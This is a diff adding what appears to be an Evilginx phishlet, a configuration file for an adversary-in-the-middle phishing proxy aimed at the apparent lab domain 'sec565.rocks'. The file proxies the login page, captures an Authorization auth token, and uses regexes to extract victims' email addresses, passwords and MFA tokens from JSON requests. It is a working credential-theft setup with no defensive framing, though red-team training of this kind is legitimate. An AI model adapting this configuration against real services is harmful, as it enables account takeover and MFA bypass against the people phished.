@@ -1,0 +1,31 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'sec565.rocks', session: true, is_landing: true, auto_filter: true}
+auth_tokens:
+  - domain: 'sec565.rocks'
+    path: '/api/auth/validate-token'
+    name: 'token'
+    header: 'Authorization'  
+    type: 'http'
+auth_urls:
+  - '/sensitive-data'
+  - '/users'
+  - '/validate-token'
+
+credentials:
+  username:
+    key: ''
+    search: '"email":"([^"]*)'
+    type: 'json'    
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+  custom:
+    key: 'mfaToken'
+    search: '"mfaToken":"([^"]*)'
+    type: 'json'
+   
+login:
+  domain: 'sec565.rocks'
+  path: '/login'
